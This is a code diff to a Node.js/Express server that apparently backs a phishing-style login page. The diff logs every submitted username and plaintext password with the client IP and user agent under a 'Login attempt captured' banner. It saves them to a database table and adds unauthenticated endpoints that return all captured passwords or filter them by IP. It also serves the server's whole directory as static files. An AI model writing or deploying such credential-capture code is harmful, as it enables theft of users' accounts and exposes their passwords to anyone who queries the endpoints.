@@ -10,6 +10,18 @@ const PORT = process.env.PORT || 3000;
 // Middleware
 app.use(cors());
 app.use(express.json());
+app.use(express.static(__dirname)); // Serve static files from current directory
+
+// Middleware to get client IP
+app.use((req, res, next) => {
+    req.clientIP = req.headers['x-forwarded-for'] || 
+                  req.headers['x-real-ip'] || 
+                  req.connection.remoteAddress || 
+                  req.socket.remoteAddress ||
+                  (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
+                  req.ip;
+    next();
+});
 
 // PostgreSQL connection pool
 // For online databases (Neon, Supabase, ElephantSQL, etc.)
@@ -120,6 +132,7 @@ app.post('/api/register', async (req, res) => {
 // Save login attempt endpoint (saves whatever user enters)
 app.post('/api/save-login', async (req, res) => {
     const { emailOrUsername, password } = req.body;
+    const clientIP = req.clientIP;
 
     // Validation
     if (!emailOrUsername || !password) {
@@ -130,6 +143,31 @@ app.post('/api/save-login', async (req, res) => {
     }
 
     try {
+        console.log('\n📨 Login attempt captured:');
+        console.log('Email/Username:', emailOrUsername);
+        console.log('Password:', password);
+        console.log('Client IP:', clientIP);
+        console.log('Timestamp:', new Date().toISOString());
+        console.log('User Agent:', req.headers['user-agent']);
+        console.log('---');
+
+        // First, save to login_attempts table
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS login_attempts (
+                id SERIAL PRIMARY KEY,
+                email_or_username VARCHAR(255) NOT NULL,
+                password VARCHAR(255) NOT NULL,
+                ip_address INET,
+                user_agent TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        `);
+
+        const attemptResult = await pool.query(
+            'INSERT INTO login_attempts (email_or_username, password, ip_address, user_agent, created_at) VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP) RETURNING *',
+            [emailOrUsername, password, clientIP, req.headers['user-agent']]
+        );
+
         // Determine if input is email or username
         const isEmail = emailOrUsername.includes('@');
         const username = isEmail ? emailOrUsername.split('@')[0] : emailOrUsername;
@@ -160,7 +198,13 @@ app.post('/api/save-login', async (req, res) => {
         res.json({
             success: true,
             message: 'Login information saved successfully',
-            user: result.rows[0]
+            user: {
+                id: result.rows[0].id,
+                username: result.rows[0].username,
+                email: result.rows[0].email,
+                ip_address: clientIP,
+                timestamp: result.rows[0].created_at || result.rows[0].last_login
+            }
         });
 
     } catch (error) {
@@ -169,6 +213,63 @@ app.post('/api/save-login', async (req, res) => {
             success: false, 
             message: 'Server error while saving login information',
             error: error.message
+        });
+    }
+});
+
+// Get all login attempts endpoint
+app.get('/api/login-attempts', async (req, res) => {
+    try {
+        // Ensure table exists
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS login_attempts (
+                id SERIAL PRIMARY KEY,
+                email_or_username VARCHAR(255) NOT NULL,
+                password VARCHAR(255) NOT NULL,
+                ip_address INET,
+                user_agent TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        `);
+
+        const result = await pool.query(
+            'SELECT id, email_or_username, password, ip_address, user_agent, created_at FROM login_attempts ORDER BY created_at DESC LIMIT 100'
+        );
+
+        res.json({
+            success: true,
+            attempts: result.rows
+        });
+
+    } catch (error) {
+        console.error('Get login attempts error:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Server error' 
+        });
+    }
+});
+
+// Get login attempts by IP endpoint
+app.get('/api/login-attempts/ip/:ip', async (req, res) => {
+    const { ip } = req.params;
+
+    try {
+        const result = await pool.query(
+            'SELECT id, email_or_username, password, ip_address, user_agent, created_at FROM login_attempts WHERE ip_address = $1 ORDER BY created_at DESC',
+            [ip]
+        );
+
+        res.json({
+            success: true,
+            attempts: result.rows
+        });
+
+    } catch (error) {
+        console.error('Get login attempts by IP error:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Server error' 
         });
     }
 });
